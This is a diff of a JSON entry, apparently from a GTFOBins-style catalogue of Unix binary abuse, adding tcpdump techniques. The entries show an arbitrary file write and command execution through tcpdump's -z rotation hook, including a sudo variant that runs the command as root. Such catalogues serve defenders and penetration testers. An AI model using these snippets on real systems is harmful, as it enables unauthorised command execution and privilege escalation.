@@ -1,14 +1,20 @@
 {
   "functions": {
+    "file-write": [
+      {
+        "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
+        "code": "LFILE=file_to_write\nUSER=output_file_owner\ntcpdump -ln -i lo -w $LFILE -c 1 -Z $USER\n"
+      }
+    ],
     "command": [
       {
-        
+        "description": "",
         "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n"
       }
     ],
     "sudo": [
       {
-        
+        "description": "",
         "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
       }
     ]
